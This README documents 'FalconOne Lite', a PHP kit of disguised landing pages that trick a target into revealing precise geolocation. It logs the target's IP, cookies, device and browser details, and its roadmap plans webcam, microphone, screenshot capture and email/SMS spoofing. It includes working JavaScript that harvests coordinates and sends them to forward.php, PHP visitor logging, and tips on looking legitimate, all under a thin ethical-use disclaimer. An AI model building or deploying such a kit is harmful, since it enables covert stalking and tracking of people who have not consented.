<p align="center">
  <img src="/FalconOne-logo-2022.png" />
</p>

<p align="center">(v.0.2) - Lite</p>


<hr>


FalconOne Lite is an Open Source solution deployed and updated on a daily basis to help prevent terror and crime globally.
By using advanced tools, functions and stealth strategies, FalconOne community is focused on making a friendly and fast solution for effective results.

<b>FalconOne can be used for the following purposes:</b>

- Main Purpose: Locating and tracking victims or criminals (through social engineering and intelligence exercises using existing or customized templates)
- Red Teaming and Penetration Testing
- Web and Mobile development
- Emergency
- Educational and Researches

For more information about the FalconOne Pro, please send an email to the Team at prochan@strikevaults.com.

<b>GENERAL NOTICE:</b>

FalconOne Lite is deployed for ethical and educational purposes only. 

[Users Should READ the Terms before starting the installation process.](#8-user-Terms)

<br>

## Contents

1. [Features](#1-Features)
2. [Scenarios](#2-Scenarios)
3. [Tool Overview](#3-Tool-Overview)
4. [Prerequisites](#4-Prerequisites)
5. [Installation/Setup](#5-InstallationSetup)
6. [Usage](#6-Usage)
7. [Community](#7-Community)
8. [User Terms](#8-user-Terms)
9. [Releases](#9-Releases-and-Updates)
10. [Templates](#10-Templates)

[Extra Links for Reconnaissance Purposes](#Extra-Links-for-Reconnaissance-Purposes)


## 1. Features

### 1.1. Actual Version 0.2 (In Progress to v1.0)

- [x] Target Accurate Location (via Google API)
- [x] Target Public IP Address (info.txt)
- [x] Target Open Port (log.txt)
- [x] Target Device Model and its Version (log.txt)
- [x] Target Browser Model and its Version (log.txt)
- [x] Target Operating System and its Version (log.txt)
- [x] Target Cookies (log.txt)
- [x] Visitors User-Agent Information (l.log)
- [x] Sharing Cycle User-Agent Information collection. This works with WhatsApp, Telegram and other social networks. (Once the Meta-Description is visible on Target/sharer devices and finally shared, sharer collected User-Agent information are logged in l.log)
- [ ] Target Webcam Activation (In progress)
- [ ] Target Microphone Activation (In progress)
- [ ] Target Screen Screenshot (In progress)

### 1.2. Additional Tools (Roadmap)

- [ ] Email Spoof (to share the trapped landing page URL from a trusted email address) (In Progress)
- [ ] SMS Spoof (to share the trapped URL from a trusted phone number - This will require an API Key) (In Progress)


## 2. Scenarios

- Got Scammed?
- Dealing with a Kidnapper?
- Aware of Malicious activities?
- In Contact with a Missing Person?


## 3. Tool Overview

FalconOne Lite is based on PHP functions that collects and triggers browser's information functionalities via disguised HTML and CSS templates.
FalconOne Lite is coded as explained below:

### 3.1. Landing Page(s)

- index.php (Main Landing page)

### 3.2. Main Style

- styles/
  - /footer.css
  - /join.css
  - /main.css

### 3.3. PHP Functions

- forward.php

### 3.4. Logs

- info.txt (for Locations)
- log.txt (for Geolocated Target User-Agent information)
- l.log (for Visitor's or Sharers User-Agent information)


## 4. Prerequisites

- Apache (Tested) or Nginx Server
- Public IP Address or a Tunnel (e.g. [Ngrok](https://ngrok.com/))
- Domain Name (Recommended for a legit approach)
- SSL Certificate (for a secure look)


## 5. Installation/Setup

- Upload the Zip file on your Web Server Public directory
- Unzip the FolconOne Lite uploaded file
- Customize index.php and CSS Styles files according to your trapping scenario


## 6. Usage

Once deployed, wait for the target to interact with the landing page functions such as buttons, links, images and popups.
Once the Target interacts with the Landing page function(s), location(s) should be stored in info.txt and other information in log.txt.

The tracking script should be kept between head and body for activity tracking (l.log):

```php
<?php
if(filesize('./l.log') > 3000000) {
	@file_put_contents('./l.log', ""); // empty log if > 3MB.
	} else {
	$log = date("F j, Y, g:i a") . ' - '. $_SERVER['REMOTE_ADDR'].' - '.$_SERVER['HTTP_USER_AGENT'].' - '. $_SERVER['HTTP_REFERER'].' - '.$_SERVER['SCRIPT_NAME']. ' - '.$_SERVER['QUERY_STRING']. PHP_EOL;
	@file_put_contents('./l.log', htmlspecialchars($log,ENT_QUOTES,'UTF-8'), FILE_APPEND);
}
?>
```

The following PHP Functions logic in index.php should not be changed:

```php
<p id="errorMessage"></p>

<script>
let message = document.getElementById("errorMessage");

function getLocation(){
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(sendLocation);
  } else{ 
    message.innerHTML = "<em>Your browser is not supported.</em>";
  }
}

function sendLocation(geoLocation) {
  window.location = "forward.php?x="+geoLocation.coords.latitude+"&y="+geoLocation.coords.longitude;
}
</script>
```

In forward.php line 37, you can edit the redirection URL which is google.com by default:

```php
header('Location: https://www.google.com/');
```

Or else redirection on line 40 which is index.html by default:

```php
header('Location: index.php');
```

The main getLocation Hook function should be respected as below:

```html
<a class="yourstyle" onclick="getLocation()">Button</a>
```


## 7. Community

... In Progress


## 8. User Terms

- Users are not allowed to deploy FalconOne Lite for malicious operations
- Users are not allowed to sell FalconOne Lite
- FalconOne Lite is FREE
- FalconOne Lite can be edited according to Users needs


## 9. Releases and Updates

### January 11th, 2022: FalconOne Lite v.0.2 (Major Update):
```
+ Added index.php
+ Added l.log
- index.html Removed
```

### January 9th, 2022: FalconOne Lite v.0.1 (Minor Update):
```
+ fixes
```

### January 8th, 2022: FalconOne Lite v.0.1 (Major Upload): 
```
+ Initial Code Upload
```

## 10. Templates

### 10.1. Geo-locate the Target

... In Progress

### 10.2. Take a Picture from the Target Webcam

... In Progress

### 10.2. Get a Voice Record from the Target Microphone

... In Progress

### 10.3. Take a Screenshot from the Target Device

... In Progress



## Extra Links for Reconnaissance Purposes

- Pegasus Spyware Samples Decompiled & Recompiled: [@jonathandata1](https://github.com/jonathandata1/pegasus_spyware)
- OSINT Tools Collections: [@cipher387](https://github.com/cipher387/osint_stuff_tool_collection)
